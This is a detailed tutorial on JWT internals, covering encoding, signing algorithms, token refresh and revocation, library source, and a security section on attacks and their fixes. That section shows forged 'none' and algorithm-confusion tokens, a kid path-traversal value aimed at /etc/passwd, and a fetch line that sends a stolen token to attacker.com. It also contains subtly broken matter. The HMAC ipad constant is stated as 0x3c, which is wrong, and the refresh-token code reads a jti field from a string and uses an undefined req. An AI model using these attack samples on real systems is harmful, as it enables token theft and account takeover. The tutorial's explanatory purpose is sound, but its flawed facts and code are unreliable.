# JWT: Internal Architecture & Runtime Mechanics

**A Deep System-Level Analysis from Token Generation to Cryptographic Verification**

---

## Table of Contents

1. [Foundational Context: Authentication State Problem](#1-foundational-context)
2. [JWT Anatomy: Binary Structure & Encoding Pipeline](#2-jwt-anatomy)
3. [Cryptographic Primitives: Signing & Verification](#3-cryptographic-primitives)
4. [Token Lifecycle: Generation to Revocation](#4-token-lifecycle)
5. [Security Model: Attack Vectors & Mitigation](#5-security-model)
6. [Implementation Deep Dive: Library Internals](#6-implementation-deep-dive)
7. [Network Protocol Integration](#7-network-protocol-integration)
8. [Storage & Transport Mechanisms](#8-storage-mechanisms)
9. [Performance Characteristics & Optimization](#9-performance-characteristics)
10. [Advanced Patterns & Edge Cases](#10-advanced-patterns)

---

<a name="1-foundational-context"></a>
## 1. Foundational Context: Authentication State Problem

### The Statelessness Dilemma

In traditional server architectures, authentication state lives in one of two places:

**Server-Side Session Store:**
```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Client    │────────>│   Web Server │────────>│   Session   │
│  (Browser)  │<────────│              │<────────│   Store     │
└─────────────┘         └──────────────┘         │  (Redis/DB) │
                         SessionID: abc123        └─────────────┘
                                                   {user:123, role:admin}
```

**Problem:** Every request requires a round-trip to the session store. In distributed systems:
- Session store becomes a single point of failure
- Network latency multiplies across microservices
- Horizontal scaling requires sticky sessions or replicated state

**JWT Solution:**
```
┌─────────────┐         ┌──────────────┐
│   Client    │────────>│   Web Server │
│  (Browser)  │<────────│              │
└─────────────┘         └──────────────┘
  Stores JWT            Verifies signature locally
                        No database lookup needed
```

The authentication state is **cryptographically embedded** in the token itself. The server verifies authenticity through signature validation, not database queries.

---

<a name="2-jwt-anatomy"></a>
## 2. JWT Anatomy: Binary Structure & Encoding Pipeline

### 2.1 Three-Part Structure

A JWT consists of three Base64URL-encoded segments separated by dots:

```
[HEADER].[PAYLOAD].[SIGNATURE]
```

**Example Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 2.2 Header: Algorithm & Token Metadata

**Decoded Header (JSON):**
```json
{
  "alg": "HS256",    // Signing algorithm
  "typ": "JWT"       // Token type
}
```

**Internal Representation:**
```c
// Pseudo-structure in memory
struct jwt_header {
    enum jwt_alg {
        HS256,   // HMAC-SHA256
        RS256,   // RSA-SHA256
        ES256,   // ECDSA-SHA256
        PS256    // RSA-PSS-SHA256
    } algorithm;

    char* type;      // "JWT"
    char* kid;       // Key ID (optional)
    char* cty;       // Content type (optional)
};
```

**Algorithm Selection Impact:**
- `HS256`: Symmetric (shared secret), fast, 256-bit key
- `RS256`: Asymmetric (public/private keypair), slower, 2048-bit key minimum
- `ES256`: Asymmetric (ECDSA), faster than RSA, 256-bit curve

### 2.3 Payload: Claims & Application Data

**Standard Claims (RFC 7519):**
```json
{
  "iss": "https://auth.example.com",     // Issuer
  "sub": "user_1234567890",              // Subject (user identifier)
  "aud": "https://api.example.com",      // Audience (intended recipient)
  "exp": 1735689600,                      // Expiration (Unix timestamp)
  "nbf": 1735603200,                      // Not Before
  "iat": 1735603200,                      // Issued At
  "jti": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"  // JWT ID (unique token ID)
}
```

**Custom Claims:**
```json
{
  "user_id": 1234567890,
  "email": "user@example.com",
  "roles": ["admin", "editor"],
  "permissions": ["read:users", "write:posts"],
  "tenant_id": "org_xyz789"
}
```

**Memory Layout in Runtime:**
```c
struct jwt_payload {
    // Standard claims
    char* issuer;
    char* subject;
    char* audience;
    time_t expiration;
    time_t not_before;
    time_t issued_at;
    char* jwt_id;

    // Custom claims stored as key-value map
    struct claim_map {
        char* key;
        union {
            char* str_value;
            int64_t int_value;
            double num_value;
            bool bool_value;
            void* json_value;  // Nested objects/arrays
        } value;
        enum claim_type { STRING, INTEGER, NUMBER, BOOLEAN, JSON } type;
    }* claims;
    size_t claim_count;
};
```

### 2.4 Base64URL Encoding Pipeline

**Why Base64URL (not standard Base64)?**
- URLs can't contain `+`, `/`, or `=` safely
- Base64URL replaces: `+` → `-`, `/` → `_`, removes padding `=`

**Encoding Flow:**
```
JSON String ──> UTF-8 Bytes ──> Base64 ──> URL-Safe Transform
```

**Implementation (pseudo-code):**
```c
char* base64url_encode(const uint8_t* input, size_t len) {
    // Step 1: Standard Base64 encoding
    static const char base64_chars[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t output_len = 4 * ((len + 2) / 3);
    char* output = malloc(output_len + 1);

    for (size_t i = 0, j = 0; i < len;) {
        uint32_t octet_a = i < len ? input[i++] : 0;
        uint32_t octet_b = i < len ? input[i++] : 0;
        uint32_t octet_c = i < len ? input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        output[j++] = base64_chars[(triple >> 18) & 0x3F];
        output[j++] = base64_chars[(triple >> 12) & 0x3F];
        output[j++] = base64_chars[(triple >> 6) & 0x3F];
        output[j++] = base64_chars[triple & 0x3F];
    }

    // Step 2: URL-safe transformation
    for (size_t i = 0; i < output_len; i++) {
        if (output[i] == '+') output[i] = '-';
        else if (output[i] == '/') output[i] = '_';
    }

    // Step 3: Remove padding
    while (output_len > 0 && output[output_len - 1] == '=') {
        output_len--;
    }
    output[output_len] = '\0';

    return output;
}
```

---

<a name="3-cryptographic-primitives"></a>
## 3. Cryptographic Primitives: Signing & Verification

### 3.1 HMAC-SHA256 (HS256) - Symmetric Algorithm

**Algorithm Flow:**
```
Message = [Header].[Payload]
Key = shared_secret
Signature = HMAC-SHA256(Key, Message)
```

**Internal Implementation (OpenSSL-style):**
```c
#include <openssl/hmac.h>

// HMAC-SHA256 signature generation
void generate_hs256_signature(
    const char* message,           // "[header].[payload]"
    size_t message_len,
    const uint8_t* secret_key,     // Shared secret
    size_t key_len,
    uint8_t* signature_out         // 32-byte output buffer
) {
    HMAC_CTX* ctx = HMAC_CTX_new();

    // Initialize HMAC context with SHA-256
    HMAC_Init_ex(ctx, secret_key, key_len, EVP_sha256(), NULL);

    // Process message
    HMAC_Update(ctx, (uint8_t*)message, message_len);

    // Finalize and extract signature
    unsigned int sig_len;
    HMAC_Final(ctx, signature_out, &sig_len);

    HMAC_CTX_free(ctx);
    // sig_len is always 32 for SHA-256
}
```

**HMAC Construction (RFC 2104):**
```
HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))

Where:
  H     = SHA-256 hash function
  K'    = Key padded/hashed to block size (64 bytes for SHA-256)
  opad  = 0x5c repeated 64 times
  ipad  = 0x3c repeated 64 times
  ||    = Concatenation
  ⊕     = XOR operation
```

**Security Properties:**
- **MAC Strength:** 256-bit output, collision resistance from SHA-256
- **Key Derivation:** Never use raw passwords; derive with PBKDF2/scrypt
- **Timing Attack Resistance:** Use constant-time comparison

```c
// Constant-time signature comparison
int verify_signature(const uint8_t* sig1, const uint8_t* sig2, size_t len) {
    volatile uint8_t result = 0;
    for (size_t i = 0; i < len; i++) {
        result |= sig1[i] ^ sig2[i];
    }
    return result == 0;  // Returns 1 if equal, 0 otherwise
}
```

### 3.2 RSA-SHA256 (RS256) - Asymmetric Algorithm

**Key Pair Structure:**
```
Private Key (used for signing):
  - Modulus (n): 2048-4096 bits
  - Private exponent (d)
  - Primes (p, q)
  - CRT parameters (dP, dQ, qInv)

Public Key (used for verification):
  - Modulus (n)
  - Public exponent (e): typically 65537
```

**Signature Generation (PKCS#1 v1.5 padding):**
```c
#include <openssl/rsa.h>
#include <openssl/sha.h>

void generate_rs256_signature(
    const char* message,
    size_t message_len,
    RSA* private_key,           // Private RSA key
    uint8_t* signature_out,     // Output buffer (256 bytes for 2048-bit key)
    unsigned int* sig_len_out
) {
    // Step 1: Hash the message
    uint8_t hash[SHA256_DIGEST_LENGTH];
    SHA256((uint8_t*)message, message_len, hash);

    // Step 2: Sign the hash with private key
    *sig_len_out = RSA_size(private_key);

    RSA_sign(
        NID_sha256,              // Hash algorithm identifier
        hash,                    // Message digest
        SHA256_DIGEST_LENGTH,    // Digest length (32 bytes)
        signature_out,           // Signature output
        sig_len_out,             // Signature length
        private_key              // Private key
    );
}
```

**Verification Flow:**
```c
int verify_rs256_signature(
    const char* message,
    size_t message_len,
    const uint8_t* signature,
    unsigned int sig_len,
    RSA* public_key
) {
    // Hash the message
    uint8_t hash[SHA256_DIGEST_LENGTH];
    SHA256((uint8_t*)message, message_len, hash);

    // Verify signature
    int result = RSA_verify(
        NID_sha256,
        hash,
        SHA256_DIGEST_LENGTH,
        signature,
        sig_len,
        public_key
    );

    return result;  // 1 = valid, 0 = invalid
}
```

**Mathematical Operation (Simplified):**
```
Signing:
  S = M^d mod n     (where M is padded hash, d is private exponent)

Verification:
  M' = S^e mod n    (where e is public exponent)
  Check: M' == M
```

**Padding Scheme (PKCS#1 v1.5):**
```
0x00 || 0x01 || PS || 0x00 || DigestInfo || Hash

Where:
  PS = 0xFF repeated to fill block
  DigestInfo = ASN.1 structure identifying hash algorithm
  Hash = SHA-256(message)
```

### 3.3 ECDSA-SHA256 (ES256) - Elliptic Curve

**Curve: P-256 (secp256r1)**
```
y² = x³ - 3x + b (mod p)

Where:
  p = 2^256 - 2^224 + 2^192 + 2^96 - 1  (prime modulus)
  b = 41058363725152142129326129780047268409114441015993725554835256314039467401291
```

**Key Generation:**
```c
#include <openssl/ec.h>

EC_KEY* generate_ec_keypair() {
    EC_KEY* key = EC_KEY_new_by_curve_name(NID_X9_62_prime256v1);  // P-256

    // Generate random private key and compute public key
    EC_KEY_generate_key(key);

    return key;
}
```

**Signature Generation (ECDSA):**
```c
void generate_es256_signature(
    const char* message,
    size_t message_len,
    EC_KEY* private_key,
    uint8_t* signature_out,
    unsigned int* sig_len_out
) {
    // Hash message
    uint8_t hash[SHA256_DIGEST_LENGTH];
    SHA256((uint8_t*)message, message_len, hash);

    // Generate ECDSA signature
    ECDSA_sign(
        0,                        // Type (unused)
        hash,                     // Message hash
        SHA256_DIGEST_LENGTH,     // Hash length
        signature_out,            // Signature (DER-encoded)
        sig_len_out,              // Signature length
        private_key
    );
}
```

**ECDSA Algorithm (Simplified):**
```
Signing:
  1. Generate random k ∈ [1, n-1]
  2. Compute point (x, y) = k × G  (G is generator point)
  3. r = x mod n
  4. s = k^(-1) × (H(m) + r × d) mod n  (d is private key)
  5. Signature = (r, s)

Verification:
  1. Compute w = s^(-1) mod n
  2. u₁ = H(m) × w mod n
  3. u₂ = r × w mod n
  4. Compute point (x', y') = u₁ × G + u₂ × Q  (Q is public key)
  5. Check: x' mod n == r
```

**Performance Comparison:**
```
Algorithm | Sign Time | Verify Time | Signature Size | Key Size
----------|-----------|-------------|----------------|----------
HS256     | ~1 µs     | ~1 µs       | 32 bytes       | 32+ bytes
RS256     | ~500 µs   | ~50 µs      | 256 bytes      | 2048 bits
ES256     | ~100 µs   | ~200 µs     | 64 bytes       | 256 bits
```

---

<a name="4-token-lifecycle"></a>
## 4. Token Lifecycle: Generation to Revocation

### 4.1 Token Generation Pipeline

**Complete Flow:**
```
User Credentials ──> Authentication ──> Claims Building ──> Signing ──> Token Delivery
```

**Implementation (Node.js - jsonwebtoken library):**
```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate token
function generateToken(userId, userEmail, roles) {
    // Step 1: Build payload
    const payload = {
        sub: userId,
        email: userEmail,
        roles: roles,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + (60 * 60),  // 1 hour
        jti: crypto.randomUUID()
    };

    // Step 2: Sign with secret
    const secret = process.env.JWT_SECRET;  // From environment

    const token = jwt.sign(payload, secret, {
        algorithm: 'HS256',
        issuer: 'https://auth.example.com',
        audience: 'https://api.example.com'
    });

    return token;
}
```

**Internal Library Flow (jsonwebtoken source):**
```javascript
// Simplified from https://github.com/auth0/node-jsonwebtoken

function sign(payload, secretOrPrivateKey, options) {
    // 1. Validate and merge options
    const header = {
        alg: options.algorithm || 'HS256',
        typ: 'JWT'
    };

    if (options.keyid) header.kid = options.keyid;

    // 2. Add standard claims
    if (options.expiresIn) {
        payload.exp = calculateExp(options.expiresIn);
    }
    if (options.notBefore) {
        payload.nbf = calculateNbf(options.notBefore);
    }
    if (options.audience) payload.aud = options.audience;
    if (options.issuer) payload.iss = options.issuer;
    if (options.subject) payload.sub = options.subject;
    if (!payload.iat) payload.iat = Math.floor(Date.now() / 1000);

    // 3. Encode header and payload
    const encodedHeader = base64urlEncode(JSON.stringify(header));
    const encodedPayload = base64urlEncode(JSON.stringify(payload));

    // 4. Create signing input
    const signingInput = encodedHeader + '.' + encodedPayload;

    // 5. Generate signature based on algorithm
    let signature;
    if (header.alg.startsWith('HS')) {
        // HMAC algorithms
        const hmac = crypto.createHmac(
            'sha' + header.alg.slice(2),  // HS256 -> sha256
            secretOrPrivateKey
        );
        hmac.update(signingInput);
        signature = base64urlEncode(hmac.digest());

    } else if (header.alg.startsWith('RS') || header.alg.startsWith('PS')) {
        // RSA algorithms
        const sign = crypto.createSign(
            'RSA-SHA' + header.alg.slice(2)
        );
        sign.update(signingInput);
        signature = base64urlEncode(
            sign.sign(secretOrPrivateKey)
        );

    } else if (header.alg.startsWith('ES')) {
        // ECDSA algorithms
        const sign = crypto.createSign(
            'sha' + header.alg.slice(2)
        );
        sign.update(signingInput);
        const derSignature = sign.sign(secretOrPrivateKey);
        // Convert DER to raw R||S format
        signature = base64urlEncode(
            derToRaw(derSignature, header.alg)
        );
    }

    // 6. Return complete token
    return signingInput + '.' + signature;
}
```

### 4.2 Token Verification Pipeline

**Verification Steps:**
```
1. Parse token structure
2. Decode header and payload
3. Verify signature
4. Validate claims (exp, nbf, iss, aud)
5. Extract user context
```

**Implementation:**
```javascript
function verifyToken(token, secret, options = {}) {
    // Step 1: Split token
    const parts = token.split('.');
    if (parts.length !== 3) {
        throw new Error('Invalid token format');
    }

    const [encodedHeader, encodedPayload, encodedSignature] = parts;

    // Step 2: Decode header and payload
    const header = JSON.parse(base64urlDecode(encodedHeader));
    const payload = JSON.parse(base64urlDecode(encodedPayload));

    // Step 3: Verify signature
    const signingInput = encodedHeader + '.' + encodedPayload;
    const expectedSignature = generateSignature(
        signingInput,
        secret,
        header.alg
    );

    if (!constantTimeCompare(encodedSignature, expectedSignature)) {
        throw new Error('Invalid signature');
    }

    // Step 4: Validate claims
    const now = Math.floor(Date.now() / 1000);

    if (payload.exp && now >= payload.exp) {
        throw new Error('Token expired');
    }

    if (payload.nbf && now < payload.nbf) {
        throw new Error('Token not yet valid');
    }

    if (options.issuer && payload.iss !== options.issuer) {
        throw new Error('Invalid issuer');
    }

    if (options.audience) {
        const audiences = Array.isArray(payload.aud)
            ? payload.aud
            : [payload.aud];

        if (!audiences.includes(options.audience)) {
            throw new Error('Invalid audience');
        }
    }

    // Step 5: Return validated payload
    return payload;
}
```

**Performance Optimization (Cached Public Keys):**
```javascript
class JWTVerifier {
    constructor() {
        this.publicKeyCache = new Map();
        this.cacheTimeout = 3600000;  // 1 hour
    }

    async verifyWithJWKS(token, jwksUri) {
        const header = this.decodeHeader(token);

        // Check cache for public key
        let publicKey = this.publicKeyCache.get(header.kid);

        if (!publicKey) {
            // Fetch JWKS from URI
            const response = await fetch(jwksUri);
            const jwks = await response.json();

            // Find matching key
            const key = jwks.keys.find(k => k.kid === header.kid);
            if (!key) throw new Error('Key not found');

            // Convert JWK to PEM format
            publicKey = jwkToPem(key);

            // Cache the key
            this.publicKeyCache.set(header.kid, publicKey);
            setTimeout(
                () => this.publicKeyCache.delete(header.kid),
                this.cacheTimeout
            );
        }

        // Verify with cached key
        return this.verify(token, publicKey);
    }
}
```

### 4.3 Token Refresh Mechanism

**Problem:** JWTs are stateless and can't be revoked. Solution: Short-lived access tokens + long-lived refresh tokens.

**Architecture:**
```
┌──────────────┐                 ┌──────────────┐
│    Client    │                 │ Auth Server  │
└──────────────┘                 └──────────────┘
       │                                │
       │  1. Login (username/password)  │
       │───────────────────────────────>│
       │                                │
       │  2. Access Token (15 min)      │
       │     Refresh Token (7 days)     │
       │<───────────────────────────────│
       │                                │
       │  3. API Request + Access Token │
       │───────────────────────────────>│ API Server
       │                                │
       │  ... 15 minutes later ...      │
       │                                │
       │  4. Access Token Expired       │
       │<───────────────────────────────│
       │                                │
       │  5. Refresh Token              │
       │───────────────────────────────>│
       │                                │
       │  6. New Access Token           │
       │     New Refresh Token          │
       │<───────────────────────────────│
```

**Implementation:**
```javascript
// Token generation with refresh
function generateTokenPair(userId) {
    // Access token: short-lived, contains user data
    const accessToken = jwt.sign(
        {
            sub: userId,
            type: 'access',
            roles: getUserRoles(userId)
        },
        ACCESS_TOKEN_SECRET,
        { expiresIn: '15m' }
    );

    // Refresh token: long-lived, minimal data, stored in DB
    const refreshToken = jwt.sign(
        {
            sub: userId,
            type: 'refresh',
            jti: crypto.randomUUID()  // Unique ID for revocation
        },
        REFRESH_TOKEN_SECRET,
        { expiresIn: '7d' }
    );

    // Store refresh token in database
    storeRefreshToken(userId, refreshToken.jti, {
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
        userAgent: req.headers['user-agent'],
        ipAddress: req.ip
    });

    return { accessToken, refreshToken };
}

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
    const { refreshToken } = req.body;

    try {
        // Verify refresh token
        const payload = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

        if (payload.type !== 'refresh') {
            throw new Error('Invalid token type');
        }

        // Check if token is in database (not revoked)
        const storedToken = await db.refreshTokens.findOne({
            userId: payload.sub,
            jti: payload.jti,
            expiresAt: { $gt: new Date() }
        });

        if (!storedToken) {
            throw new Error('Token revoked or expired');
        }

        // Generate new token pair
        const tokens = generateTokenPair(payload.sub);

        // Revoke old refresh token
        await db.refreshTokens.deleteOne({ jti: payload.jti });

        res.json(tokens);

    } catch (error) {
        res.status(401).json({ error: 'Invalid refresh token' });
    }
});
```

### 4.4 Token Revocation Strategies

**Challenge:** JWTs are stateless - the server can't invalidate them before expiration.

**Strategy 1: Blacklist (Deny List)**
```javascript
// Store revoked tokens in Redis with expiration
class TokenBlacklist {
    constructor(redisClient) {
        this.redis = redisClient;
    }

    async revoke(token) {
        const decoded = jwt.decode(token);
        const ttl = decoded.exp - Math.floor(Date.now() / 1000);

        // Store token ID with TTL matching token expiration
        await this.redis.setex(
            `blacklist:${decoded.jti}`,
            ttl,
            '1'
        );
    }

    async isRevoked(token) {
        const decoded = jwt.decode(token);
        const exists = await this.redis.exists(`blacklist:${decoded.jti}`);
        return exists === 1;
    }
}

// Middleware
async function checkBlacklist(req, res, next) {
    const token = extractToken(req);

    if (await blacklist.isRevoked(token)) {
        return res.status(401).json({ error: 'Token revoked' });
    }

    next();
}
```

**Strategy 2: Version-based Invalidation**
```javascript
// Add version to user record
const userSchema = new Schema({
    userId: String,
    email: String,
    tokenVersion: { type: Number, default: 0 }
});

// Include version in token
function generateToken(user) {
    return jwt.sign({
        sub: user.userId,
        email: user.email,
        ver: user.tokenVersion  // Token version
    }, secret, { expiresIn: '1h' });
}

// Verify version during validation
async function validateToken(token) {
    const payload = jwt.verify(token, secret);

    const user = await User.findById(payload.sub);

    if (user.tokenVersion !== payload.ver) {
        throw new Error('Token invalidated');
    }

    return payload;
}

// Revoke all tokens by incrementing version
async function revokeAllUserTokens(userId) {
    await User.updateOne(
        { userId },
        { $inc: { tokenVersion: 1 } }
    );
}
```

**Strategy 3: Short-Lived Tokens + Refresh Flow**
```
Access Token: 15 minutes (stateless, no revocation needed)
Refresh Token: Stored in DB, can be revoked immediately
```

---

<a name="5-security-model"></a>
## 5. Security Model: Attack Vectors & Mitigation

### 5.1 Algorithm Confusion Attack (CVE-2015-9235)

**Vulnerability:**
```javascript
// Vulnerable code
function verifyToken(token, publicKey) {
    const header = decodeHeader(token);

    // BUG: Trusts algorithm from token header
    if (header.alg === 'HS256') {
        return jwt.verify(token, publicKey);  // Uses public key as HMAC secret!
    } else if (header.alg === 'RS256') {
        return jwt.verify(token, publicKey);
    }
}
```

**Attack Scenario:**
```
1. Attacker obtains server's RSA public key (usually public)
2. Attacker creates malicious token with alg: "HS256"
3. Attacker signs token using public key as HMAC secret
4. Server validates with HS256, using public key as secret ✓ (EXPLOIT!)
```

**Malicious Token:**
```json
// Header
{
  "alg": "HS256",  // Changed from RS256!
  "typ": "JWT"
}

// Payload
{ "sub": "admin",
  "role": "superuser"
}

// Signature = HMAC-SHA256(publicKey, "[header].[payload]")
```

**Mitigation:**
```javascript
function verifyToken(token, secret, options) {
    // ALWAYS specify expected algorithm
    const expectedAlg = options.algorithms || ['HS256'];

    const header = decodeHeader(token);

    // Reject if algorithm doesn't match expectation
    if (!expectedAlg.includes(header.alg)) {
        throw new Error(`Unexpected algorithm: ${header.alg}`);
    }

    return jwt.verify(token, secret, { algorithms: expectedAlg });
}
```

### 5.2 None Algorithm Attack

**Vulnerability:**
```json
{
  "alg": "none",  // No signature required!
  "typ": "JWT"
}
```

**Attack:**
```javascript
// Attacker creates unsigned token
const header = base64url(JSON.stringify({ alg: "none", typ: "JWT" }));
const payload = base64url(JSON.stringify({ sub: "admin", role: "superuser" }));
const maliciousToken = header + '.' + payload + '.';  // Empty signature
```

**Mitigation:**
```javascript
// Explicitly reject 'none' algorithm
const ALLOWED_ALGORITHMS = ['HS256', 'RS256', 'ES256'];

function verifyToken(token, secret) {
    const header = decodeHeader(token);

    if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
        throw new Error('Algorithm "none" not allowed');
    }

    if (!ALLOWED_ALGORITHMS.includes(header.alg)) {
        throw new Error('Algorithm not allowed');
    }

    // ... rest of verification
}
```

### 5.3 JWT Injection via kid (Key ID) Parameter

**Vulnerability:**
```javascript
// Vulnerable code
function loadKey(header) {
    // BUG: Unsanitized file path
    const keyPath = `/keys/${header.kid}.pem`;
    return fs.readFileSync(keyPath);
}
```

**Attack:**
```json
{
  "alg": "HS256",
  "kid": "../../etc/passwd"  // Path traversal!
}
```

**Mitigation:**
```javascript
function loadKey(header) {
    const kid = header.kid;

    // Validate kid format
    if (!/^[a-zA-Z0-9_-]+$/.test(kid)) {
        throw new Error('Invalid key ID format');
    }

    // Use allowlist
    const VALID_KEYS = new Set(['key1', 'key2', 'key3']);
    if (!VALID_KEYS.has(kid)) {
        throw new Error('Unknown key ID');
    }

    const keyPath = path.join(__dirname, 'keys', `${kid}.pem`);

    // Verify path is within expected directory
    if (!keyPath.startsWith(path.join(__dirname, 'keys'))) {
        throw new Error('Invalid key path');
    }

    return fs.readFileSync(keyPath);
}
```

### 5.4 Timing Attacks on Signature Verification

**Vulnerable Code:**
```javascript
function verifySignature(expected, actual) {
    // BUG: Comparison stops at first mismatch
    if (expected.length !== actual.length) return false;

    for (let i = 0; i < expected.length; i++) {
        if (expected[i] !== actual[i]) {
            return false;  // Early return leaks information!
        }
    }

    return true;
}
```

**Attack:** Attacker measures response time to brute-force signature byte-by-byte.

**Mitigation:**
```javascript
const crypto = require('crypto');

function verifySignature(expected, actual) {
    // Constant-time comparison using crypto.timingSafeEqual
    if (expected.length !== actual.length) {
        // Use dummy comparison to avoid length-based timing leak
        crypto.timingSafeEqual(
            Buffer.alloc(32),
            Buffer.alloc(32)
        );
        return false;
    }

    return crypto.timingSafeEqual(
        Buffer.from(expected),
        Buffer.from(actual)
    );
}
```

### 5.5 XSS via JWT Storage

**Vulnerable Pattern:**
```javascript
// Storing JWT in localStorage (accessible to JavaScript)
localStorage.setItem('token', jwt);

// Malicious script can steal token
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

**Mitigation:**
```javascript
// Use httpOnly cookies (not accessible to JavaScript)
res.cookie('token', jwt, {
    httpOnly: true,     // Prevents JavaScript access
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000     // 1 hour
});
```

**Cookie Attributes Explained:**
```
Set-Cookie: token=<JWT>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

HttpOnly:  JavaScript cannot read via document.cookie
Secure:    Only sent over HTTPS
SameSite:  Prevents CSRF (cookie not sent on cross-origin requests)
Path:      Cookie scope
Max-Age:   Expiration in seconds
```

### 5.6 CSRF Protection with JWTs

**Double Submit Cookie Pattern:**
```javascript
// Server generates CSRF token
const csrfToken = crypto.randomBytes(32).toString('hex');

// Send token in both cookie AND response body
res.cookie('csrf-token', csrfToken, { sameSite: 'strict' });
res.json({
    accessToken: jwt,
    csrfToken: csrfToken
});

// Client includes CSRF token in header
fetch('/api/data', {
    headers: {
        'Authorization': `Bearer ${jwt}`,
        'X-CSRF-Token': csrfToken
    }
});

// Server validates match
function validateCSRF(req, res, next) {
    const cookieToken = req.cookies['csrf-token'];
    const headerToken = req.headers['x-csrf-token'];

    if (!cookieToken || !headerToken || cookieToken !== headerToken) {
        return res.status(403).json({ error: 'CSRF validation failed' });
    }

    next();
}
```

---

<a name="6-implementation-deep-dive"></a>
## 6. Implementation Deep Dive: Library Internals

### 6.1 jsonwebtoken (Node.js) Architecture

**Source Repository:** https://github.com/auth0/node-jsonwebtoken

**Core Modules:**
```
jsonwebtoken/
├── index.js                 # Main entry point
├── sign.js                  # Token generation
├── verify.js                # Token validation
├── decode.js                # Token parsing (no verification)
├── JsonWebTokenError.js     # Custom error types
├── NotBeforeError.js
├── TokenExpiredError.js
└── lib/
    ├── timespan.js          # Time parsing (1h, 7d, etc.)
    ├── validateAsymmetricKey.js
    └── psSupported.js
```

**Signing Implementation (sign.js excerpt):**
```javascript
// https://github.com/auth0/node-jsonwebtoken/blob/master/sign.js

const jws = require('jws');
const ms = require('ms');

module.exports = function (payload, secretOrPrivateKey, options, callback) {
  // Handle optional callback
  if (typeof options === 'function') {
    callback = options;
    options = {};
  } else {
    options = options || {};
  }

  const isObjectPayload = typeof payload === 'object' && !Buffer.isBuffer(payload);

  const header = Object.assign({
    alg: options.algorithm || 'HS256',
    typ: isObjectPayload ? 'JWT' : undefined,
    kid: options.keyid
  }, options.header);

  function failure(err) {
    if (callback) {
      return callback(err);
    }
    throw err;
  }

  if (!secretOrPrivateKey && options.algorithm !== 'none') {
    return failure(new Error('secretOrPrivateKey must have a value'));
  }

  if (typeof payload === 'undefined') {
    return failure(new Error('payload is required'));
  } else if (isObjectPayload) {
    try {
      validatePayload(payload);
    } catch (error) {
      return failure(error);
    }

    payload = Object.assign({}, payload);
  } else {
    const invalid_options = options_for_objects.filter(function (opt) {
      return typeof options[opt] !== 'undefined';
    });

    if (invalid_options.length > 0) {
      return failure(new Error('invalid ' + invalid_options.join(',') + ' option for ' + (typeof payload) + ' payload'));
    }
  }

  // Add standard claims
  if (typeof payload.exp !== 'undefined' && typeof options.expiresIn !== 'undefined') {
    return failure(new Error('Bad "options.expiresIn" option. The payload already has an "exp" property.'));
  }

  if (typeof payload.nbf !== 'undefined' && typeof options.notBefore !== 'undefined') {
    return failure(new Error('Bad "options.notBefore" option. The payload already has an "nbf" property.'));
  }

  try {
    if (typeof options.expiresIn !== 'undefined') {
      if (typeof options.expiresIn !== 'number' && typeof options.expiresIn !== 'string') {
        return failure(new Error('"expiresIn" should be a number of seconds or string representing a timespan eg: "1d", "20h", 60'));
      }
      if (typeof payload === 'string') {
        return failure(new Error('invalid expiresIn option for string payload'));
      }
      payload.exp = Math.floor(Date.now() / 1000) + ms(options.expiresIn) / 1000;
    }

    if (typeof options.notBefore !== 'undefined') {
      if (typeof options.notBefore !== 'number' && typeof options.notBefore !== 'string') {
        return failure(new Error('"notBefore" should be a number of seconds or string representing a timespan eg: "1d", "20h", 60'));
      }
      if (typeof payload === 'string') {
        return failure(new Error('invalid notBefore option for string payload'));
      }
      payload.nbf = Math.floor(Date.now() / 1000) + ms(options.notBefore) / 1000;
    }

    if (options.audience)
      payload.aud = options.audience;

    if (options.issuer)
      payload.iss = options.issuer;

    if (options.subject)
      payload.sub = options.subject;

    if (options.jwtid)
      payload.jti = options.jwtid;

    if (!options.noTimestamp) {
      payload.iat = payload.iat || Math.floor(Date.now() / 1000);
    }

  } catch (err) {
    return failure(err);
  }

  const encoding = options.encoding || 'utf8';

  // Use jws library for signing
  const sign = jws.sign({
    header: header,
    payload: payload,
    secret: secretOrPrivateKey,
    encoding: encoding
  });

  if (callback) {
    callback(null, sign);
  } else {
    return sign;
  }
};
```

**Verification Implementation (verify.js excerpt):**
```javascript
// https://github.com/auth0/node-jsonwebtoken/blob/master/verify.js

const jws = require('jws');
const JsonWebTokenError = require('./lib/JsonWebTokenError');
const NotBeforeError = require('./lib/NotBeforeError');
const TokenExpiredError = require('./lib/TokenExpiredError');

module.exports = function(jwtString, secretOrPublicKey, options, callback) {
  if ((typeof options === 'function') && !callback) {
    callback = options;
    options = {};
  }

  if (!options) {
    options = {};
  }

  // Clone options
  options = Object.assign({}, options);

  let done;
  if (callback) {
    done = callback;
  } else {
    done = function(err, data) {
      if (err) throw err;
      return data;
    };
  }

  if (options.clockTimestamp && typeof options.clockTimestamp !== 'number') {
    return done(new JsonWebTokenError('clockTimestamp must be a number'));
  }

  const clockTimestamp = options.clockTimestamp || Math.floor(Date.now() / 1000);

  if (!jwtString) {
    return done(new JsonWebTokenError('jwt must be provided'));
  }

  if (typeof jwtString !== 'string') {
    return done(new JsonWebTokenError('jwt must be a string'));
  }

  const parts = jwtString.split('.');
  if (parts.length !== 3) {
    return done(new JsonWebTokenError('jwt malformed'));
  }

  let decodedToken;
  try {
    decodedToken = jws.decode(jwtString, { complete: true });
  } catch(err) {
    return done(err);
  }

